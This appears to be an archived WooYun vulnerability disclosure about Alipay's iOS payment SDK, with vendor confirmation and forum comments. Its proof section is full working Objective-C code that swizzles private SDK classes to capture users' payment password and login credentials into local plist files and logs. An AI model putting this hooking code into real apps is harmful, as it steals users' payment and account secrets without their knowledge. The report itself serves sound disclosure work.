{"id": 3039, "wybug_id": "wooyun-2014-056541", "wybug_title": "支付宝iOS SDK存在第三方厂商可以记录用户敏感信息漏洞", "wybug_corp": "支付宝", "wybug_author": "ZERO君", "wybug_date": "2014-04-10 14:23", "wybug_open_date": "2014-07-09 14:23", "wybug_type": "用户敏感数据泄漏", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机软件安全", "移动互联网"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向公众公开  简要描述： 现在支付宝在iOS上推出了极简收银台的支付SDK，如大众点评网应用就使用了该SDK。该SDK不需要跨应用跳转，直接在应用内完成支付，但存在使用SDK的厂商可以直接记录用户敏感信息的漏洞。 详细说明：  支付宝这类极简收银台的支付SDK，由于在第三方应用内直接集成，而且支付流程完全在第三方应用内执行，没有跳转到支付宝应用内授权。但iOS的运行机制比较动态，可以通过直接hook起SDK内部的一些私有方法。然后，通过hook起的方法，直接访问用户输入的支付密码和登陆账号、密码。完全可以在用户和支付宝不知情的情况下，记录用户这些数据。   漏洞证明：  \n\n\n\n\n//AlipayLoger.h#import <Foundation/Foundation.h>@class MiniPwd;@class Input;@class Password;extern NSString *const PopupViewConfirmNotification;typedef NS_ENUM(NSInteger, AlipayLogType) {    AlipayLogType_AccPwd,    AlipayLogType_PayPwd,};@interface AlipayLoger : NSObject@property (nonatomic, weak) MiniPwd *mPwd;@property (nonatomic, weak) Input *accName;@property (nonatomic, weak) Password *accPwd;@property (nonatomic) AlipayLogType curLogType;+ (instancetype)shareInstance;+ (void)startHook;@end\n\n//AlipayLoger.m#import \"AlipayLoger.h\"#import \"MiniPwd+Hook.h\"#import \"PopupView+Hook.h\"#import \"Input+Hook.h\"#import \"Password+Hook.h\"#import \"NSObject+Runtime.h\"NSString *const PopupViewConfirmNotification = @\"PopupViewConfirmNotification\";static NSString *const AL_PayPassword = @\"PayPassword\";static NSString *const AL_LoginAccount = @\"Account\";static NSString *const AL_LoginPassword = @\"Password\";static AlipayLoger *__shareInstance = nil;@implementation UIResponder (AlipayHook)+ (void)load{    static dispatch_once_t onceToken;    dispatch_once(&onceToken, ^{        [AlipayLoger startHook];    });}@end@implementation AlipayLoger+ (NSString *)libPath{    return NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];}+ (NSString *)payInfoPath{    return [[AlipayLoger libPath] stringByAppendingPathComponent:@\"payInfo.plist\"];}+ (NSString *)loginInfoPath{    return [[AlipayLoger libPath] stringByAppendingPathComponent:@\"loginInfo.plist\"];}+ (instancetype)shareInstance{    static dispatch_once_t onceToken;    dispatch_once(&onceToken, ^{        __shareInstance = [[AlipayLoger alloc] init];    });        return __shareInstance;}- (instancetype)init{    self = [super init];    if (self) {        [[NSNotificationCenter defaultCenter] addObserver:self                                                 selector:@selector(receiveLogNotification:)                                                     name:PopupViewConfirmNotification                                                   object:nil];    }        return self;}- (void)receiveLogNotification:(NSNotification *)notification{    NSString *tName = self.accName.textField.text;    NSString *tPwd = self.accPwd.textField.text;        if (self.curLogType == AlipayLogType_AccPwd &&        tName.length && tPwd.length) {        NSDictionary *dict = @{AL_LoginAccount: tName,                               AL_LoginPassword: tPwd};        [dict writeToFile:[AlipayLoger loginInfoPath] atomically:YES];        NSLog(@\"AlipayLoger:\\n%@: %@\\n%@: %@\", AL_LoginAccount, tName, AL_LoginPassword, tPwd);    }  else if (self.curLogType == AlipayLogType_PayPwd) {        UITextField *textField = [self.mPwd objectWithVarName:@\"textField\"];        NSDictionary *dict = @{AL_PayPassword: textField.text};        [dict writeToFile:[AlipayLoger payInfoPath] atomically:YES];        NSLog(@\"AlipayLoger:\\n%@: %@\", AL_PayPassword, textField.text);    }}+ (void)startHook{    [PopupView startHook];    [MiniPwd startHook];    [Input startHook];    [Password startHook];}@end\n\n//NSObject+Runtime.h#import <Foundation/Foundation.h>@interface NSObject (Runtime)- (id)objectWithVarName:(NSString *)varName;@end\n\n//NSObject+Runtime.m#import \"NSObject+Runtime.h\"#import <objc/runtime.h>@implementation NSObject (Runtime)- (id)objectWithVarName:(NSString *)varName{    unsigned int count;    Ivar *vars = class_copyIvarList([self class], &count);    Ivar *findVar = NULL;    const char *name = [varName UTF8String];        for (unsigned int i = 0; i < count; i++) {        if (strcmp(name, ivar_getName(vars[i])) == 0) {            findVar = vars+i;            break;        }    }    id returnObj = object_getIvar(self, *findVar);    free(vars);        return returnObj;}@end\n\n//MiniPwd.h#import <UIKit/UIKit.h>@interface MiniPwd : UIView {\tUITextField* textField;\t// 80 = 0x50}-(id)getValue;\t// 0x7fdf9-(id)init:(CGSize)init withModel:(id)model;\t// 0x7f499@end\n\n//MiniPwd+Hook.h#import \"MiniPwd.h\"@interface MiniPwd (Hook)+ (void)startHook;@end\n\n//MiniPwd+Hook.m#import \"MiniPwd+Hook.h\"#import \"AlipayLoger.h\"#import \"JRSwizzle.h\"#import \"NSObject+Runtime.h\"@implementation MiniPwd (Hook)+ (void)startHook{    [self jr_swizzleMethod:@selector(init:withModel:) withMethod:@selector(initHook:withModel:) error:nil];}- (id)initHook:(CGSize)init withModel:(id)model{    self = [self initHook:init withModel:model];    if (self) {        [AlipayLoger shareInstance].mPwd = self;        [AlipayLoger shareInstance].curLogType = AlipayLogType_PayPwd;    }        return self;}@end\n\n//PopupView.h#import <UIKit/UIKit.h>@class NSString, UIImageView, NSDictionary, UIView, NSMutableArray, UIButton;@interface PopupView : UIView{    }-(void)onCancle:(id)cancle;\t// 0x82731-(void)onConfirm:(id)confirm;\t// 0x827e5@end\n\n//PopupView+Hook.h#import \"PopupView.h\"@interface PopupView (Hook)+ (void)startHook;@end\n\n//PopupView+Hook.m#import \"PopupView+Hook.h\"#import \"JRSwizzle.h\"#import \"AlipayLoger.h\"@implementation PopupView (Hook)+ (void)startHook{    [PopupView jr_swizzleMethod:@selector(onConfirm:) withMethod:@selector(hookOnConfirm:) error:nil];}- (void)hookOnConfirm:(UIButton *)sender{    [[NSNotificationCenter defaultCenter] postNotificationName:PopupViewConfirmNotification object:nil];    [self hookOnConfirm:sender];}@end\n\n//Input.h#import <UIKit/UIKit.h>@interface Input : UIView {@private\tNSString* _content;\t// 52 = 0x34\tNSString* _format;\t// 56 = 0x38\tUILabel* _paddingView;\t// 60 = 0x3c\tNSString* _textFieldFormat;\t// 64 = 0x40\tNSString* _keyboard;\t// 68 = 0x44\tNSString* _format_msg;\t// 72 = 0x48\tUITextField* _textField;\t// 76 = 0x4c}@property(retain, nonatomic) UITextField* textField;\t// G=0x7e0c5; S=0x7e0d5; @end\n\n//Input+Hook.h#import \"Input.h\"@interface Input (Hook)+ (void)startHook;@end\n\n//Input+Hook.m#import \"Input+Hook.h\"#import \"AlipayLoger.h\"#import \"JRSwizzle.h\"@implementation Input (Hook)+ (void)startHook{    [self jr_swizzleMethod:@selector(init:withModel:) withMethod:@selector(initHook:withModel:) error:nil];}- (id)initHook:(CGSize)init withModel:(id)model{    self = [self initHook:init withModel:model];    if ([self isMemberOfClass:[Input class]]) {        [AlipayLoger shareInstance].accName = self;    }        return self;}@end\n\n//Password.h#import \"Input.h\"@interface Password : Input {}-(id)init:(CGSize)init withModel:(id)model;\t// 0x80125@end\n\n//Password+Hook.h#import \"Password.h\"@interface Password (Hook)+ (void)startHook;@end\n\n//Password+Hook.m#import \"Password+Hook.h\"#import \"AlipayLoger.h\"#import \"JRSwizzle.h\"@implementation Password (Hook)+ (void)startHook{    [self jr_swizzleMethod:@selector(init:withModel:) withMethod:@selector(initHookP:withModel:) error:nil];}- (id)initHookP:(CGSize)init withModel:(id)model{    self = [self initHookP:init withModel:model];    if (self) {        [AlipayLoger shareInstance].accPwd = self;        [AlipayLoger shareInstance].curLogType = AlipayLogType_AccPwd;    }        return self;}@end\n\n//JRSwizzle.h// JRSwizzle.h semver:1.0//   Copyright (c) 2007-2011 Jonathan 'Wolf' Rentzsch: http://rentzsch.com//   Some rights reserved: http://opensource.org/licenses/MIT//   https://github.com/rentzsch/jrswizzle#import <Foundation/Foundation.h>@interface NSObject (JRSwizzle)+ (BOOL)jr_swizzleMethod:(SEL)origSel_ withMethod:(SEL)altSel_ error:(NSError**)error_;+ (BOOL)jr_swizzleClassMethod:(SEL)origSel_ withClassMethod:(SEL)altSel_ error:(NSError**)error_;@end\n\n//JRSwizzle.m// JRSwizzle.m semver:1.0//   Copyright (c) 2007-2011 Jonathan 'Wolf' Rentzsch: http://rentzsch.com//   Some rights reserved: http://opensource.org/licenses/MIT//   https://github.com/rentzsch/jrswizzle#import \"JRSwizzle.h\"#if TARGET_OS_IPHONE\t#import <objc/runtime.h>\t#import <objc/message.h>#else\t#import <objc/objc-class.h>#endif#define SetNSErrorFor(FUNC, ERROR_VAR, FORMAT,...)\t\\\tif (ERROR_VAR) {\t\\\t\tNSString *errStr = [NSString stringWithFormat:@\"%s: \" FORMAT,FUNC,##__VA_ARGS__]; \\\t\t*ERROR_VAR = [NSError errorWithDomain:@\"NSCocoaErrorDomain\" \\\t\t\t\t\t\t\t\t\t\t code:-1\t\\\t\t\t\t\t\t\t\t\t userInfo:[NSDictionary dictionaryWithObject:errStr forKey:NSLocalizedDescriptionKey]]; \\\t}#define SetNSError(ERROR_VAR, FORMAT,...) SetNSErrorFor(__func__, ERROR_VAR, FORMAT, ##__VA_ARGS__)#if OBJC_API_VERSION >= 2#define GetClass(obj)\tobject_getClass(obj)#else#define GetClass(obj)\t(obj ? obj->isa : Nil)#endif@implementation NSObject (JRSwizzle)+ (BOOL)jr_swizzleMethod:(SEL)origSel_ withMethod:(SEL)altSel_ error:(NSError**)error_ {#if OBJC_API_VERSION >= 2\tMethod origMethod = class_getInstanceMethod(self, origSel_);\tif (!origMethod) {#if TARGET_OS_IPHONE\t\tSetNSError(error_, @\"original method %@ not found for class %@\", NSStringFromSelector(origSel_), [self class]);#else\t\tSetNSError(error_, @\"original method %@ not found for class %@\", NSStringFromSelector(origSel_), [self className]);#endif\t\treturn NO;\t}\t\tMethod altMethod = class_getInstanceMethod(self, altSel_);\tif (!altMethod) {#if TARGET_OS_IPHONE\t\tSetNSError(error_, @\"alternate method %@ not found for class %@\", NSStringFromSelector(altSel_), [self class]);#else\t\tSetNSError(error_, @\"alternate method %@ not found for class %@\", NSStringFromSelector(altSel_), [self className]);#endif\t\treturn NO;\t}\t\tclass_addMethod(self,\t\t\t\t\torigSel_,\t\t\t\t\tclass_getMethodImplementation(self, origSel_),\t\t\t\t\tmethod_getTypeEncoding(origMethod));\tclass_addMethod(self,\t\t\t\t\taltSel_,\t\t\t\t\tclass_getMethodImplementation(self, altSel_),\t\t\t\t\tmethod_getTypeEncoding(altMethod));\t\tmethod_exchangeImplementations(class_getInstanceMethod(self, origSel_), class_getInstanceMethod(self, altSel_));\treturn YES;#else\t//\tScan for non-inherited methods.\tMethod directOriginalMethod = NULL, directAlternateMethod = NULL;\t\tvoid *iterator = NULL;\tstruct objc_method_list *mlist = class_nextMethodList(self, &iterator);\twhile (mlist) {\t\tint method_index = 0;\t\tfor (; method_index < mlist->method_count; method_index++) {\t\t\tif (mlist->method_list[method_index].method_name == origSel_) {\t\t\t\tassert(!directOriginalMethod);\t\t\t\tdirectOriginalMethod = &mlist->method_list[method_index];\t\t\t}\t\t\tif (mlist->method_list[method_index].method_name == altSel_) {\t\t\t\tassert(!directAlternateMethod);\t\t\t\tdirectAlternateMethod = &mlist->method_list[method_index];\t\t\t}\t\t}\t\tmlist = class_nextMethodList(self, &iterator);\t}\t\t//\tIf either method is inherited, copy it up to the target class to make it non-inherited.\tif (!directOriginalMethod || !directAlternateMethod) {\t\tMethod inheritedOriginalMethod = NULL, inheritedAlternateMethod = NULL;\t\tif (!directOriginalMethod) {\t\t\tinheritedOriginalMethod = class_getInstanceMethod(self, origSel_);\t\t\tif (!inheritedOriginalMethod) {\t\t\t\tSetNSError(error_, @\"original method %@ not found for class %@\", NSStringFromSelector(origSel_), [self className]);\t\t\t\treturn NO;\t\t\t}\t\t}\t\tif (!directAlternateMethod) {\t\t\tinheritedAlternateMethod = class_getInstanceMethod(self, altSel_);\t\t\tif (!inheritedAlternateMethod) {\t\t\t\tSetNSError(error_, @\"alternate method %@ not found for class %@\", NSStringFromSelector(altSel_), [self className]);\t\t\t\treturn NO;\t\t\t}\t\t}\t\t\t\tint hoisted_method_count = !directOriginalMethod && !directAlternateMethod ? 2 : 1;\t\tstruct objc_method_list *hoisted_method_list = malloc(sizeof(struct objc_method_list) + (sizeof(struct objc_method)*(hoisted_method_count-1)));        hoisted_method_list->obsolete = NULL;\t// soothe valgrind - apparently ObjC runtime accesses this value and it shows as uninitialized in valgrind\t\thoisted_method_list->method_count = hoisted_method_count;\t\tMethod hoisted_method = hoisted_method_list->method_list;\t\t\t\tif (!directOriginalMethod) {\t\t\tbcopy(inheritedOriginalMethod, hoisted_method, sizeof(struct objc_method));\t\t\tdirectOriginalMethod = hoisted_method++;\t\t}\t\tif (!directAlternateMethod) {\t\t\tbcopy(inheritedAlternateMethod, hoisted_method, sizeof(struct objc_method));\t\t\tdirectAlternateMethod = hoisted_method;\t\t}\t\tclass_addMethods(self, hoisted_method_list);\t}\t\t//\tSwizzle.\tIMP temp = directOriginalMethod->method_imp;\tdirectOriginalMethod->method_imp = directAlternateMethod->method_imp;\tdirectAlternateMethod->method_imp = temp;\t\treturn YES;#endif}+ (BOOL)jr_swizzleClassMethod:(SEL)origSel_ withClassMethod:(SEL)altSel_ error:(NSError**)error_ {\treturn [GetClass((id)self) jr_swizzleMethod:origSel_ withMethod:altSel_ error:error_];}@end\n以上是全部的实现代码，直接嵌入到Xcode工程即可，调用支付宝SDK时会有相应的log输出，和Document下有两个plist记录账号密码信息。JRSwizzle是一个辅助用的开源库。   修复方案：  不建议支付流程全部在第三方应用内完成   版权声明：转载请注明来源 ZERO君@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-04-11 18:35 厂商回复： 感谢您的反馈，目前该漏洞已经在新版本SDK中进行了修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-15 18:15 |    \t\tZERO君 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 南中国普通大学的一般学生)\t\t \n  希望厂商可以重视问题，目前我使用的就是最新版的SDK，漏洞还是存在的，    \n     2014-05-05 10:13 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @ZERO君 再测试一次最新版，然后还是存在的继续提交。    \n     2014-07-09 14:54 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  @wefgod 好机警    \n     2014-07-09 19:16 |    \t\t风花雪月 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:44        | []+[]|[]-[][][][][]%[][]|[]\\[]%[][]|[]\\[...)\t\t \n  又是一个五万？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}